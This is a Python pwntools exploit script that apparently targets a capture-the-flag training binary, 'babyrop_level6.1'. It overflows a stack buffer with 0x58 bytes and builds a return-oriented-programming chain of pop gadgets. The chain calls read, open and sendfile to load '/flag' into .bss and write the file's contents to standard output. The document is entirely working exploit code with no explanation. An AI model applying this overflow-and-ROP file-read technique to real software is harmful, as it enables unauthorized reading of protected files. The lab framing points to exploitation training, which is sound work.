from pwn import *

p = process('/challenge/babyrop_level6.1')

bss = 0x405060

read_plt = 0x4010d0
open_plt = 0x401100
sendfile_plt = 0x4010e0

pop_rdi = 0x401fd8
pop_rsi = 0x401ff0
pop_rdx = 0x401fe8
pop_rcx = 0x401fe0

payload = b"A" * 0x58

payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi) + p64(bss)
payload += p64(pop_rdx) + p64(6)
payload += p64(read_plt)

payload += p64(pop_rdi) + p64(bss)
payload += p64(pop_rsi) + p64(0)
payload += p64(open_plt)

payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi) + p64(3)
payload += p64(pop_rdx) + p64(0)
payload += p64(pop_rcx) + p64(0x1000)
payload += p64(sendfile_plt)

p.send(payload)
p.send(b"/flag\x00")

p.interactive()
